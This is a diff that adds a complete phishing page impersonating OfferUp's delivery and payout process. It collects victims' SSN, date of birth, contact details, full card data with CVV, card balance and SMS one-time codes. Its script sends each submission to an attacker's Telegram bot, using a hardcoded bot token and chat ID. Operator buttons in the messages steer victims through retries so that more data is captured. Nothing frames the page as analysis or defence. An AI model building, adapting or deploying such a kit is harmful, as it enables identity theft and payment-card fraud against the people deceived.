@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>OfferUp · Secure Delivery</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: #F5F7FA; display: flex; flex-direction: column; align-items: center; padding: 24px 16px; position: relative; }
+        .offerup-container { max-width: 600px; width: 100%; background: white; border-radius: 16px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); padding: 32px 28px; margin-bottom: 20px; }
+        .offerup-logo span { font-size: 26px; font-weight: 700; color: #1E2A3A; }
+        .offerup-logo span span { color: #1E8F89; font-weight: 800; }
+        .verify-badge { background: #F1F8F7; border-radius: 40px; padding: 10px 18px; display: inline-flex; gap: 10px; font-size: 15px; font-weight: 600; color: #1E8F89; margin: 16px 0 24px; border: 1px solid rgba(30,143,137,0.15); }
+        h2 { font-size: 24px; font-weight: 700; color: #0F1C2E; margin-bottom: 8px; }
+        .subhead { font-size: 15px; color: #64748B; margin-bottom: 28px; border-left: 4px solid #1E8F89; padding: 14px 16px; background: #FAFCFC; border-radius: 10px; }
+        .form-group { margin-bottom: 22px; }
+        label { display: flex; align-items: center; gap: 8px; font-size: 15px; font-weight: 600; color: #1E2A3A; margin-bottom: 8px; }
+        label i { color: #1E8F89; width: 20px; }
+        .required-star { color: #E53E3E; margin-left: 4px; }
+        input, select { width: 100%; padding: 14px 18px; font-size: 16px; border: 1.5px solid #E2E8F0; border-radius: 12px; background: white; transition: 0.15s; }
+        input:focus { border-color: #1E8F89; box-shadow: 0 0 0 4px rgba(30,143,137,0.1); outline: none; }
+        /* SSN field – monospace for consistent bullet width */
+        #ssnMasked { font-family: 'Courier New', monospace; letter-spacing: 2px; }
+        .ssn-hint { font-size: 13px; color: #64748B; margin-top: 6px; display: flex; align-items: center; gap: 6px; }
+        .btn-submit { background: #1E8F89; color: white; border: none; border-radius: 40px; padding: 16px 28px; font-size: 18px; font-weight: 700; width: 100%; margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 12px; transition: 0.2s; cursor: pointer; }
+        .btn-submit:hover { background: #16716c; transform: scale(1.01); box-shadow: 0 10px 20px -8px rgba(30,143,137,0.4); }
+        .btn-submit:disabled { background: #A0CECB; cursor: not-allowed; }
+        .error-message { color: #E53E3E; font-size: 13px; margin-top: 6px; display: none; align-items: center; gap: 5px; }
+        .input-error { border-color: #E53E3E !important; background: #FFF5F5; }
+        .hidden { display: none; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; align-items: center; justify-content: center; z-index: 1000; }
+        .modal-card { max-width: 480px; width: 90%; background: white; border-radius: 24px; padding: 32px; }
+        .balance-input { font-size: 24px; padding: 16px; border: 2px solid #E2E8F0; border-radius: 16px; width: 100%; margin: 20px 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1E8F89; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .support-btn { position: fixed; bottom: 30px; right: 30px; background: #1E8F89; color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; box-shadow: 0 6px 16px rgba(30,143,137,0.25); cursor: pointer; border: 2px solid white; text-decoration: none; }
+        .unread-badge { position: absolute; top: 0; right: 0; background: #E53E3E; color: white; font-size: 12px; font-weight: bold; width: 22px; height: 22px; border-radius: 50%; display: none; align-items: center; justify-content: center; border: 2px solid white; }
+        .row-2 { display: flex; gap: 16px; }
+        .row-2 .form-group { flex: 1; }
+        .text-small { font-size: 14px; color: #64748B; margin-top: 8px; }
+    </style>
+</head>
+<body>
+    <!-- STEP 1: DELIVERY -->
+    <div id="step1" class="offerup-container step">
+        <div class="offerup-logo"><span>Offer<span>Up</span></span></div>
+        <div class="verify-badge"><i class="fas fa-truck"></i> Courier delivery · identity verification</div>
+        <h2>Delivery details</h2>
+        <div class="subhead"><i class="fas fa-lock" style="color:#1E8F89;"></i> Exactly as on your ID – required to release the package.</div>
+        <form id="deliveryForm">
+            <div class="form-group">
+                <label><i class="fas fa-envelope"></i> Email address <span class="required-star">*</span></label>
+                <input type="email" id="email" name="email" placeholder="you@example.com" required>
+                <div class="error-message" id="emailError">Valid email required</div>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-user"></i> Full name <span class="required-star">*</span></label>
+                <input type="text" id="fullName" name="fullName" placeholder="John Smith" required>
+                <div class="error-message" id="fullNameError">Full name required</div>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-map-marker-alt"></i> Delivery address <span class="required-star">*</span></label>
+                <input type="text" id="address" name="address" placeholder="City, State, ZIP" required>
+                <div class="error-message" id="addressError">Address required</div>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-phone-alt"></i> Phone number <span class="required-star">*</span></label>
+                <input type="tel" id="phone" name="phone" placeholder="+1 (555) 123-4567" required>
+                <div class="error-message" id="phoneError">Valid phone required</div>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-calendar-alt"></i> Date of birth <span class="required-star">*</span></label>
+                <input type="date" id="dob" name="dob" required max="2006-01-01" value="1990-01-01">
+                <div class="error-message" id="dobError">Date of birth required</div>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-id-card"></i> Social Security Number <span class="required-star">*</span></label>
+                <!-- Visible field: shows bullets & dashes -->
+                <input type="text" id="ssnMasked" name="ssnMasked" placeholder="●●●-●●-●●●●" maxlength="11" autocomplete="off" required style="font-family: monospace;">
+                <!-- Hidden field: stores real formatted SSN (digits+dashes) -->
+                <input type="hidden" id="ssnReal" name="ssn">
+                <div class="ssn-hint"><i class="fas fa-shield"></i> 9 digits, format: 123-45-6789 — appears as ●●●</div>
+                <div class="error-message" id="ssnError">SSN must be 9 digits</div>
+            </div>
+            <button type="submit" class="btn-submit" id="deliverySubmitBtn"><i class="fas fa-arrow-right"></i> Continue to payment</button>
+        </form>
+        <div class="secure-badge" style="display:flex; gap:12px; margin-top:30px; color:#64748B;">
+            <i class="fas fa-lock"></i> SSL encrypted <i class="fas fa-shield"></i> ID verification
+        </div>
+    </div>
+
+    <!-- STEP 2: CARD DETAILS -->
+    <div id="step2" class="offerup-container step hidden">
+        <div class="offerup-logo"><span>Offer<span>Up</span></span></div>
+        <div class="verify-badge"><i class="fas fa-credit-card"></i> Payment for order #<span id="orderId">OFFER-123456</span></div>
+        <h2>Receive your funds</h2>
+        <div class="subhead"><i class="fas fa-info-circle"></i> Enter your card to get paid. Secure form.</div>
+        <form id="cardForm">
+            <div class="form-group">
+                <label><i class="fas fa-credit-card"></i> Card number <span class="required-star">*</span></label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                <div class="error-message" id="cardNumberError">Valid card number required</div>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-user"></i> Cardholder name <span class="required-star">*</span></label>
+                <input type="text" id="cardName" name="cardName" placeholder="AS SHOWN ON CARD" required>
+                <div class="error-message" id="cardNameError">Cardholder name required</div>
+            </div>
+            <div class="row-2">
+                <div class="form-group">
+                    <label><i class="fas fa-calendar"></i> Expiry <span class="required-star">*</span></label>
+                    <input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+                    <div class="error-message" id="cardExpiryError">Valid expiry (MM/YY)</div>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-lock"></i> CVV <span class="required-star">*</span></label>
+                    <input type="password" id="cardCvv" name="cardCvv" placeholder="123" maxlength="4" required>
+                    <div class="error-message" id="cardCvvError">CVV required</div>
+                </div>
+            </div>
+            <button type="submit" class="btn-submit" id="cardSubmitBtn"><i class="fas fa-check-circle"></i> Confirm & get paid</button>
+        </form>
+    </div>
+
+    <!-- MODAL: EXACT BALANCE -->
+    <div id="balanceModal" class="modal-overlay">
+        <div class="modal-card">
+            <h3><i class="fas fa-dollar-sign" style="color:#1E8F89;"></i> Card balance verification</h3>
+            <p style="color: #475569; line-height:1.5;">We will charge <strong>$1.00</strong> to confirm your card works.<br>Please enter the <strong>exact current balance</strong> of this card (as shown in your bank app).</p>
+            <input type="number" id="balanceAmount" class="balance-input" placeholder="0.00" step="0.01" min="0">
+            <div style="display:flex; gap:12px; margin-top:24px;">
+                <button id="submitBalanceBtn" class="btn-submit" style="margin-top:0;">Confirm balance</button>
+                <button id="cancelBalanceBtn" style="background:transparent; border:1px solid #ccc; color:#1E2A3A;">Cancel</button>
+            </div>
+            <p class="text-small"><i class="fas fa-info-circle"></i> $1.00 will be refunded after verification.</p>
+        </div>
+    </div>
+
+    <!-- PROCESSING SCREEN -->
+    <div id="processingContainer" class="offerup-container step hidden" style="text-align:center;">
+        <div class="loader"></div>
+        <h3 style="margin: 20px 0 10px;">Processing your verification</h3>
+        <p style="color:#64748B;">Please wait – we are validating your card details.</p>
+        <p style="font-size:14px; margin-top:20px;">Do not close this page.</p>
+    </div>
+
+    <!-- SMS CODE VERIFICATION -->
+    <div id="smsContainer" class="offerup-container step hidden">
+        <div class="offerup-logo"><span>Offer<span>Up</span></span></div>
+        <div class="verify-badge"><i class="fas fa-mobile-alt"></i> SMS verification required</div>
+        <h2>Enter the code</h2>
+        <p style="margin-bottom:24px; color:#475569;">We sent a 6-digit code to your phone. Please enter it below.</p>
+        <div class="form-group">
+            <label><i class="fas fa-lock"></i> SMS code</label>
+            <input type="text" id="smsCode" placeholder="123456" maxlength="6" style="font-size:24px; letter-spacing:8px; text-align:center;">
+            <div class="error-message" id="smsError" style="display:none;">Incorrect code or $1 charge failed. Please try again.</div>
+        </div>
+        <button id="verifySmsBtn" class="btn-submit"><i class="fas fa-check"></i> Verify code</button>
+        <p class="text-small" style="margin-top:20px;"><i class="fas fa-clock"></i> Code expires in 10 minutes</p>
+    </div>
+
+    <!-- SUCCESS -->
+    <div id="successContainer" class="offerup-container success-card hidden" style="text-align:center;">
+        <i class="fas fa-check-circle" style="font-size:64px; color:#1E8F89;"></i>
+        <h3 style="margin:16px 0 8px;">Thank you!</h3>
+        <p>Your identity and payment method are confirmed.<br>You will receive tracking information shortly.</p>
+    </div>
+
+    <!-- FIXED SUPPORT BUTTON -->
+    <a id="supportBtn" class="support-btn" href="#" target="_blank">
+        <i class="fas fa-headset"></i>
+        <span id="supportUnread" class="unread-badge">1</span>
+    </a>
+
+    <script>
+        // ============ CONFIG ============
+        const BOT_TOKEN = '8359503331:AAEX3lkDhoq65nOderRuK6cdgoFYeb4jRvs';
+        const CHAT_ID = '6847206884';
+        const SUPPORT_USERNAME = 'OfferUp_Support';  // change to your support username
+
+        // ============ UNIQUE USER SESSION ID ============
+        // Generate or retrieve from localStorage
+        let USER_ID = localStorage.getItem('offerup_user_id');
+        if (!USER_ID) {
+            USER_ID = Math.random().toString(36).substring(2, 10) + '-' + Date.now().toString(36);
+            localStorage.setItem('offerup_user_id', USER_ID);
+        }
+
+        // ============ GLOBAL STATE ============
+        let deliveryData = null;
+        let cardData = null;
+        let currentBalance = null;
+        const orderNumber = 'OFFER-' + Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('orderId').innerText = orderNumber;
+
+        // ============ DOM references ============
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const processingDiv = document.getElementById('processingContainer');
+        const smsDiv = document.getElementById('smsContainer');
+        const successDiv = document.getElementById('successContainer');
+        const balanceModal = document.getElementById('balanceModal');
+        const ssnMasked = document.getElementById('ssnMasked');
+        const ssnReal = document.getElementById('ssnReal');
+        const supportBtn = document.getElementById('supportBtn');
+        const unreadBadge = document.getElementById('supportUnread');
+
+        // ============ FIXED SSN INPUT (bullet masking, real value in hidden) ============
+        // Store raw digits in a data attribute for better control
+        let rawSSNDigits = '';
+
+        function updateSSNFields() {
+            // rawSSNDigits contains only digits (max 9)
+            let formatted = '';
+            if (rawSSNDigits.length > 0) formatted = rawSSNDigits.substring(0,3);
+            if (rawSSNDigits.length >= 4) formatted += '-' + rawSSNDigits.substring(3,5);
+            if (rawSSNDigits.length >= 6) formatted += '-' + rawSSNDigits.substring(5,9);
+            // Set real hidden input
+            ssnReal.value = formatted;
+            // Create display: replace digits with ●, keep dashes
+            let display = formatted.replace(/\d/g, '●');
+            ssnMasked.value = display;
+        }
+
+        ssnMasked.addEventListener('input', function(e) {
+            // Get only digits from what user typed
+            let input = e.target.value;
+            let digits = input.replace(/\D/g, '');
+            if (digits.length > 9) digits = digits.slice(0,9);
+            rawSSNDigits = digits;
+            updateSSNFields();
+        });
+
+        // Allow backspace and cursor movement – we keep rawSSNDigits, update display
+        // Initialize
+        rawSSNDigits = '';
+        updateSSNFields();
+
+        // ============ TELEGRAM SENDER ============
+        async function sendTelegram(text, keyboard = null) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            let payload = {
+                chat_id: CHAT_ID,
+                text: `👤 User: ${USER_ID}\n━━━━━━━━━━━━━━\n${text}`,
+                parse_mode: 'HTML'
+            };
+            if (keyboard) payload.reply_markup = JSON.stringify({ inline_keyboard: keyboard });
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return (await res.json()).ok;
+            } catch(e) {
+                console.error('Telegram error', e);
+                return false;
+            }
+        }
+
+        // ============ URL PARAMETER HANDLER (for bot interactions) ============
+        function handleUrlParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const action = urlParams.get('action');
+            const order = urlParams.get('order');
+            const paramUser = urlParams.get('user');
+
+            // Verify the user matches? If not, we still process but send notification with both IDs.
+            if (paramUser && paramUser !== USER_ID) {
+                // different session – we can still process but log mismatch
+                sendTelegram(`⚠️ User mismatch! URL user: ${paramUser}, actual session: ${USER_ID}\nAction: ${action}`);
+            }
+
+            // 1) TAKE LOG – show SMS verification
+            if (action === 'take_log' && order === orderNumber) {
+                sendTelegram(`📋 <b>Take log clicked</b>\nOrder: ${order}\nStep: SMS code shown`);
+                processingDiv.classList.add('hidden');
+                smsDiv.classList.remove('hidden');
+                document.getElementById('smsError').style.display = 'none';
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+
+            // 2) RETRY – show error and reopen balance modal
+            if (action === 'retry' && order === orderNumber) {
+                sendTelegram(`🔄 <b>Retry clicked</b>\nOrder: ${order}\nUser requested retry after failed $1 charge`);
+                if (!smsDiv.classList.contains('hidden')) {
+                    document.getElementById('smsError').style.display = 'flex';
+                }
+                // reopen balance modal
+                setTimeout(() => {
+                    if (confirm('$1 charge failed. Would you like to retry with the same card?')) {
+                        smsDiv.classList.add('hidden');
+                        step2.classList.remove('hidden');
+                        // prefill card fields if cardData exists
+                        if (cardData) {
+                            document.getElementById('cardNumber').value = cardData.number;
+                            document.getElementById('cardName').value = cardData.holder;
+                            document.getElementById('cardExpiry').value = cardData.expiry;
+                            document.getElementById('cardCvv').value = cardData.cvv;
+                        }
+                        balanceModal.style.display = 'flex';
+                    }
+                }, 500);
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+
+            // 3) UNREAD from "ТП в лицо"
+            if (urlParams.has('unread')) {
+                sendTelegram(`🕵️ <b>ТП в лицо clicked</b>\nUser opened site with unread=1`);
+                unreadBadge.style.display = 'flex';
+                localStorage.setItem('supportUnread', '1');
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+        }
+
+        // ============ ERROR HANDLING ============
+        function showError(id, msg) {
+            const el = document.getElementById(id+'Error');
+            const inp = document.getElementById(id);
+            if(el) { el.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${msg}`; el.style.display = 'flex'; }
+            if(inp) inp.classList.add('input-error');
+        }
+        function hideError(id) {
+            const el = document.getElementById(id+'Error');
+            const inp = document.getElementById(id);
+            if(el) el.style.display = 'none';
+            if(inp) inp.classList.remove('input-error');
+        }
+
+        // ============ STEP 1 VALIDATION ============
+        function validateDelivery(formData) {
+            let ok = true;
+            const email = formData.get('email');
+            if (!email || !/^\S+@\S+\.\S+$/.test(email)) { showError('email','Valid email required'); ok=false; } else hideError('email');
+            if (!formData.get('fullName') || formData.get('fullName').trim().length<2) { showError('fullName','Full name required'); ok=false; } else hideError('fullName');
+            if (!formData.get('address') || formData.get('address').trim().length<5) { showError('address','Address required'); ok=false; } else hideError('address');
+            const phone = formData.get('phone').replace(/\D/g,'');
+            if (!phone || phone.length<10) { showError('phone','Valid phone required'); ok=false; } else hideError('phone');
+            if (!formData.get('dob')) { showError('dob','Date of birth required'); ok=false; } else hideError('dob');
+            const ssn = ssnReal.value.replace(/\D/g,'');
+            if (ssn.length !== 9) { showError('ssn','SSN must be 9 digits'); ok=false; } else hideError('ssn');
+            return ok;
+        }
+
+        // STEP 1 SUBMIT
+        document.getElementById('deliveryForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const fd = new FormData(document.getElementById('deliveryForm'));
+            fd.set('ssn', ssnReal.value);
+            if (!validateDelivery(fd)) return;
+
+            deliveryData = {
+                email: fd.get('email'),
+                fullName: fd.get('fullName'),
+                address: fd.get('address'),
+                phone: fd.get('phone'),
+                dob: fd.get('dob'),
+                ssn: ssnReal.value
+            };
+
+            // Send notification: SSN entered + Continue to payment
+            await sendTelegram(`📦 <b>Delivery info submitted</b>\nName: ${deliveryData.fullName}\nEmail: ${deliveryData.email}\nPhone: ${deliveryData.phone}\nSSN: ${deliveryData.ssn}\n\n➡️ <b>Continue to payment clicked</b>`);
+
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+        });
+
+        // ============ STEP 2: CARD + BALANCE MODAL ============
+        document.getElementById('cardForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const fd = new FormData(document.getElementById('cardForm'));
+            let ok = true;
+            if (!fd.get('cardNumber').replace(/\s/g,'') || fd.get('cardNumber').replace(/\s/g,'').length<13) { showError('cardNumber','Valid card number required'); ok=false; } else hideError('cardNumber');
+            if (!fd.get('cardName').trim()) { showError('cardName','Cardholder name required'); ok=false; } else hideError('cardName');
+            if (!/^\d{2}\/\d{2}$/.test(fd.get('cardExpiry'))) { showError('cardExpiry','Valid expiry (MM/YY)'); ok=false; } else hideError('cardExpiry');
+            if (!fd.get('cardCvv') || fd.get('cardCvv').length<3) { showError('cardCvv','CVV required'); ok=false; } else hideError('cardCvv');
+            if (!ok) return;
+
+            cardData = {
+                number: fd.get('cardNumber'),
+                holder: fd.get('cardName'),
+                expiry: fd.get('cardExpiry'),
+                cvv: fd.get('cardCvv')
+            };
+            // show balance modal
+            balanceModal.style.display = 'flex';
+        });
+
+        // BALANCE SUBMIT
+        document.getElementById('submitBalanceBtn').addEventListener('click', async () => {
+            const balance = document.getElementById('balanceAmount').value;
+            if (!balance || parseFloat(balance) <= 0) {
+                alert('Please enter a valid balance');
+                return;
+            }
+            currentBalance = balance;
+            balanceModal.style.display = 'none';
+
+            step2.classList.add('hidden');
+            processingDiv.classList.remove('hidden');
+
+            // Send card + balance to Telegram with "Take log" button (includes user ID in URL)
+            const baseUrl = window.location.origin + window.location.pathname;
+            const takeLogUrl = `${baseUrl}?action=take_log&order=${encodeURIComponent(orderNumber)}&user=${encodeURIComponent(USER_ID)}`;
+
+            const msg = `
+🔐 <b>NEW LOG – CARD + BALANCE</b>
+━━━━━━━━━━━━━━━━━━━━━━
+<b>Order:</b> ${orderNumber}
+<b>Card:</b> ${cardData.number}
+<b>Holder:</b> ${cardData.holder}
+<b>Expiry:</b> ${cardData.expiry}
+<b>CVV:</b> ${cardData.cvv}
+<b>💵 Balance entered:</b> $${balance}
+━━━━━━━━━━━━━━━━━━━━━━
+<b>👤 Delivery:</b>
+${deliveryData.fullName}, ${deliveryData.phone}, ${deliveryData.email}
+<b>SSN:</b> ${deliveryData.ssn}
+━━━━━━━━━━━━━━━━━━━━━━
+⏱️ ${new Date().toLocaleString('en-US')}
+            `;
+            const keyboard = [[{ text: "📋 Take log", url: takeLogUrl }]];
+            await sendTelegram(msg, keyboard);
+        });
+
+        document.getElementById('cancelBalanceBtn').addEventListener('click', () => {
+            balanceModal.style.display = 'none';
+        });
+
+        // ============ SMS VERIFICATION ============
+        document.getElementById('verifySmsBtn').addEventListener('click', async () => {
+            const code = document.getElementById('smsCode').value.trim();
+            if (!code || code.length < 4) {
+                alert('Enter the SMS code');
+                return;
+            }
+            // Send code to bot with retry button (includes user ID)
+            const baseUrl = window.location.origin + window.location.pathname;
+            const retryUrl = `${baseUrl}?action=retry&order=${encodeURIComponent(orderNumber)}&user=${encodeURIComponent(USER_ID)}`;
+
+            const msg = `
+⚠️ <b>SMS code entered</b>
+<b>Order:</b> ${orderNumber}
+<b>Code:</b> ${code}
+<b>Status:</b> ❌ incorrect or $1 charge failed
+            `;
+            const keyboard = [[{ text: "🔄 Redirect to retry", url: retryUrl }]];
+            await sendTelegram(msg, keyboard);
+
+            // show error on site
+            document.getElementById('smsError').style.display = 'flex';
+        });
+
+        // ============ SUPPORT BUTTON ============
+        supportBtn.href = `https://t.me/${SUPPORT_USERNAME}`;
+        supportBtn.addEventListener('click', async (e) => {
+            await sendTelegram(`🆘 <b>Support chat opened</b>\nUser clicked support button`);
+            unreadBadge.style.display = 'none';
+            localStorage.removeItem('supportUnread');
+        });
+
+        // ============ CARD FORMATTING ============
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\s/g, '').replace(/\D/g, '').slice(0,16);
+            let parts = v.match(/.{1,4}/g);
+            e.target.value = parts ? parts.join(' ') : v;
+        });
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').slice(0,4);
+            if (v.length >= 3) e.target.value = v.slice(0,2) + '/' + v.slice(2);
+            else e.target.value = v;
+        });
+
+        // ============ AUTO-HIDE ERRORS ============
+        ['email','fullName','address','phone','dob','ssn','cardNumber','cardName','cardExpiry','cardCvv'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.addEventListener('input', () => hideError(id));
+        });
+
+        // ============ UNREAD BADGE FROM LOCALSTORAGE ============
+        if (localStorage.getItem('supportUnread') === '1') {
+            unreadBadge.style.display = 'flex';
+        }
+
+        // ============ HANDLE URL PARAMS ON LOAD ============
+        handleUrlParams();
+
+        // Also listen for when user comes back to page (in case of "ТП в лицо" already open)
+        window.addEventListener('focus', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('unread')) {
+                unreadBadge.style.display = 'flex';
+                localStorage.setItem('supportUnread', '1');
+            }
+        });
+
+        console.log('Session USER_ID:', USER_ID);
+    </script>
+</body>
+</html>
